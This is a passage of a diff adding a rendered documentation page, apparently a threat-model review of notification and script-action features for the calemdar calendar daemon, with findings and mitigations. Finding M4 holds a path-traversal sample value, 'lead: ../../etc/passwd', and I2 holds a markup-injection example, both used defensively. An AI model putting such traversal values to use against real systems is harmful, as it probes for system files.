+v1 already redacts the ntfy URL via <code>redactURL</code> in <code>internal/notify/notify.go:29-35</code>. Extending the registry to libnotify, ntfy, and pluggable backends multiplies the log sites. New backends will likely be added without remembering to redact.
+<strong>Mitigation:</strong>
+- Define a <code>Backend</code> interface with a <code>LogID() string</code> method that returns a redacted, stable identifier (<code>"ntfy:my-topic"</code>, <code>"libnotify:user@host"</code>). All log lines reference <code>LogID()</code>, never the raw URL or any auth material.
+- Add a <code>BackendConfig</code> validator that runs <code>url.Parse</code> + <code>Redacted()</code> on every URL field at config-load time and stores the redacted form alongside the raw. Logs read the redacted form; spawn sites read the raw form. Wiring the wrong one fails type-check, not just review.</p>
+<p><strong>M3 — DoS via large <code>notify</code> arrays / fast-firing scheduler / fork storm.</strong>
+<em>Surface:</em> <code>notify:</code> array size on a single event; LeadMinutes count; tick frequency; spawn parallelism.
+A <code>recurring/foo.md</code> with <code>notify:</code> containing 10 000 entries, each with a different lead, becomes 10 000 scheduler entries × N spawn attempts per tick. A fast <code>lead: 1s</code> (if sub-minute leads are accepted) plus a poorly-written script that takes 90 s to exit creates a fork bomb if there's no concurrency cap.
+<strong>Mitigation:</strong>
+- Cap <code>len(notify)</code> per event at, say, 16 entries. Reject parsing the file with a clear error if exceeded.
+- Cap per-config <code>LeadMinutes</code> at 16 entries (extend v1 limit if there isn't one already — <code>internal/config/config.go:141-145</code> only checks positivity).
+- Minimum lead value: refuse anything below 1 minute. Sub-minute leads add precision pressure on the tick loop without giving the user real value.
+- Per-process semaphore on <code>run</code> spawns. Concrete: <code>chan struct{}</code> of capacity 4; spawn blocks on send. Excess spawns log "skipped: run-pool full" and drop the notify (don't queue).
+- Per-script timeout: <code>exec.CommandContext</code> with a 30 s timeout. SIGTERM on timeout, SIGKILL after 5 s grace. Reaped reliably so zombies don't accumulate.
+- Per-script memory/CPU is left to the script; document that the daemon does not sandbox the child. (Going further would mean cgroups via systemd-run, which is out of scope but listed here for the next reviewer.)</p>
+<p><strong>M4 — <code>notify_fired</code> / dedupe state-file corruption or write-amplification.</strong>
+<em>Surface:</em> whichever store the new subsystem uses to persist "already-fired" markers across daemon restarts. v1 holds dedupe in-memory only (<code>Notifier.seen</code>, <code>internal/notify/notify.go:57</code>); v2 will need a persistent table to survive restarts within a lead window.
+- Concurrent writes: the tick loop and a future "manual fire" CLI command both writing the same row → SQL <code>UNIQUE</code> violations or race.
+- Corrupt entry: a malformed <code>lead</code> value in frontmatter (e.g. <code>lead: ../../etc/passwd</code>) gets composed into the dedupe key and stored — depending on the schema this is harmless (TEXT column) or harmful (someone parses the key apart later).
+- Unbounded growth: dedupe rows for events that have been deleted from disk are never reaped.
+<strong>Mitigation:</strong>
+- Schema: <code>(event_path TEXT, lead_seconds INTEGER, fired_at_unix INTEGER, PRIMARY KEY(event_path, lead_seconds))</code>. <code>lead</code> stored as parsed seconds, not as raw string. Forces validation at parse time.
+- All inserts use <code>INSERT OR IGNORE</code> and treat the conflict as "already fired". No race-prone read-then-write.
+- Reaper: nightly job (extend <code>runNightly</code> in <code>internal/serve/nightly.go</code>) deletes rows where <code>fired_at_unix &lt; now - 7d</code>. Bounded growth.
+- Validate every <code>lead</code> value at parse time: must be a duration string parseable by <code>time.ParseDuration</code>, must be ≥ 1 minute, must be ≤ 30 days. Reject the whole <code>notify</code> entry on failure with a logged error citing the source path.</p>
+<h3 id="low">Low<a class="headerlink" href="#low" title="Permanent link">&para;</a></h3>
+<p><strong>L1 — Time-based misfires from clock skew, DST, or timezone confusion.</strong>
+<em>Surface:</em> the tick loop matching <code>now + lead</code> against an event start time. v1 already has a <code>windowHalf = 30s</code> slack (<code>internal/notify/notify.go:45</code>). v2 inherits the same logic but adds the action runner — so a misfire is no longer "the user got a confusing push", it's "a script ran at the wrong wall-clock time".
+- DST transition: an event scheduled at <code>02:30</code> local on the spring-forward day doesn't exist; the lead window matches twice on fall-back. v1 already lives with this for ntfy. With <code>run</code>, "ran twice" matters more (idempotency burden moves to the script).
+- NTP skew on the laptop: a laggy clock fires the action late.
+- Daemon was suspended (laptop closed): on resume, the tick loop wakes and matches every "missed" lead window in one shot. Could fire many actions in rapid succession.
+<strong>Mitigation:</strong>
+- On daemon startup (or after a <code>time.Now()</code> jump &gt; 5 minutes between ticks — detectable via comparing <code>time.Now()</code> to the previous tick + <code>tickInterval</code>), enter "skew-recovery" mode: do not fire <code>run</code> actions for windows that the daemon should have processed during the gap. Only fire ntfy-style notifs for those (informational). User opts in to "fire actions after suspend" via config if they really want it.
+- Document that scripts must be idempotent (the daemon makes no guarantee of exactly-once).
+- Continue using the dedupe table from M4 as the second line of defence: if a <code>(path, lead)</code> pair fired in the last hour, skip.</p>
+<p><strong>L2 — <code>notify.run</code> argv leakage to other local users via <code>/proc</code>.</strong>
+<em>Surface:</em> spawn site argv.
+On Linux, <code>/proc/&lt;pid&gt;/cmdline</code> is world-readable by default. Anything in argv is visible to every other user on the laptop for the lifetime of the child. If a user's <code>args:</code> contains a personal token (e.g. <code>{API_KEY}</code> interpolated from somewhere), it's visible.
+<strong>Mitigation:</strong>
+- Document in the user-facing README: "do not put secrets in <code>args</code>. Pass secrets via <code>env</code> (which is readable only by you) or have the script read them from a file."
+- If feeling thorough, expose only <code>env</code>, not <code>args</code>, in v1. Adds a constraint, but argv is a security wart and dropping it removes a footgun.
+- Note: env in <code>/proc/&lt;pid&gt;/environ</code> is mode 0600 owned by the running user, so safe from other local users on a sane system. Still not safe from another process running as the same user — but that's outside our threat model.</p>
+<p><strong>L3 — <code>notify</code> array on <code>recurring/&lt;x&gt;.md</code> propagates to every expanded event.</strong>
+<em>Surface:</em> <code>internal/reconcile/series.go</code> (not read here, but the v1 design has the recurring root's body copied into each expanded event verbatim — see <code>model.Root.Body</code> comment, <code>internal/model/root.go:21-22</code>).
+If <code>notify:</code> lives in the root and gets stamped into every expanded <code>events/&lt;cal&gt;/&lt;year&gt;/&lt;date&gt;-&lt;slug&gt;.md</code>, then a single edit to the root mass-produces hundreds of <code>run</code>-bearing event files. Not a vuln in itself, but raises the surface area of the C1 attack: an attacker who modifies one <code>recurring/foo.md</code> causes the daemon to schedule actions for every future occurrence in the 12-month horizon, all at once after reconcile.
+<strong>Mitigation:</strong>
+- Decide the propagation rule explicitly: roots' <code>notify:</code> is <em>referenced</em> at fire-time (read live from the root file), not <em>copied</em> into each event. Single source of truth, no fan-out, cleaner edit semantics.
+- If propagation must be copy-style, at least cap occurrences-per-reconcile — refuse to expand a recurring root that would generate &gt; 1 000 occurrences in the horizon (probably already implicit via horizon * frequency caps elsewhere; verify).</p>
+<h3 id="informational">Informational<a class="headerlink" href="#informational" title="Permanent link">&para;</a></h3>
+<p><strong>I1 — Backend registry expansion as a future foot-gun.</strong>
+The brief mentions an "extensible registry" for backends. Each new backend is a new place where:
+- secrets can leak to logs (M2),
+- spawn or HTTP arg construction can mishandle untrusted strings (H1, H3),
+- env can leak (M1).
+Recommend a single <code>Backend</code> interface with audited methods (<code>Send(ctx, body, headers, logID) error</code>), and require every new implementation to ship with: a unit test that asserts no raw URL appears in logs; a test that confirms control characters in the body don't break wire framing; a code review checkbox referencing this document. Future-proofing is cheaper than auditing each backend separately.</p>
+<p><strong>I2 — libnotify backend has its own surface (<code>notify-send</code> argv).</strong>
+If the system-notif backend is implemented by shelling out to <code>notify-send</code>, it inherits a small version of H1/H3: event title/body becomes argv to <code>notify-send</code>. <code>notify-send</code> itself does not interpret shell metachars (no shell involved if invoked via <code>exec.Command</code>), but it does interpret a small Pango markup subset on some libnotify versions. Title <code>&lt;a href="…"&gt;click&lt;/a&gt;</code> may render as a link. Low impact under the threat model (it's the user's own notification daemon rendering it locally) but worth acknowledging. Mitigation: pass <code>--no-markup</code> if available, or strip <code>&lt;</code> <code>&gt;</code> <code>&amp;</code> from title/body before invoking. No shell wrapping.</p>
+<h2 id="surfaces-explicitly-out-of-scope-for-this-review">Surfaces explicitly out of scope for this review<a class="headerlink" href="#surfaces-explicitly-out-of-scope-for-this-review" title="Permanent link">&para;</a></h2>
+<ul>
+<li>The libnotify backend's binary itself (system component, trusted).</li>
+<li>The ntfy server's behaviour (remote system, separate trust domain).</li>
+<li>syncthing's transport security (covered by syncthing's own threat model).</li>
+<li>The Obsidian plugin's vault-write behaviour (it's the user's editor; its compromise is equivalent to the user's compromise).</li>
+</ul>
+<h2 id="top-3-must-implement-before-v2-ships">Top-3 must-implement before v2 ships<a class="headerlink" href="#top-3-must-implement-before-v2-ships" title="Permanent link">&para;</a></h2>
+<ol>
+<li><strong><code>notifications.actions.enabled: false</code> by default</strong>, with an allowlist of resolved absolute script paths in <code>~/.config/calemdar/config.yaml</code> (un-synced). No <code>run:</code> spawns at all if either is missing. Covers C1, C2, H2.</li>
+<li><strong><code>exec.Command(path, args...)</code> with explicit child env</strong>, no <code>sh -c</code>, no <code>Fields()</code> splitting, no parent-env inheritance. Covers H1, H3, M1.</li>
+<li><strong>Bounded everything</strong>: cap <code>notify</code> array size per event (16), cap LeadMinutes per config (16), minimum lead (1 minute), per-spawn timeout (30 s), concurrent-spawn semaphore (4), dedupe TTL reaper. Covers M3, M4, L1.</li>
+</ol>
+<h2 id="one-design-level-recommendation">One design-level recommendation<a class="headerlink" href="#one-design-level-recommendation" title="Permanent link">&para;</a></h2>
+<p>Move <code>run:</code> out of the synced markdown. Vault carries action <em>names</em>; <code>~/.config/calemdar/actions.yaml</code> (un-synced, on the laptop only) maps names to scripts. The synced surface stays inert. This is the single change that meaningfully reduces the trust-shape mismatch surfaced in C2 — every other mitigation in this document is a defence-in-depth layer on top of "the vault is allowed to declare what to run". If the vault can only declare <em>which</em> of N pre-blessed actions to invoke, the worst a sync-channel attacker can do is fire one of the user's own scripts at the wrong time.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/arch-err/calemdar" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.top", "navigation.sections", "content.action.edit", "content.code.copy", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
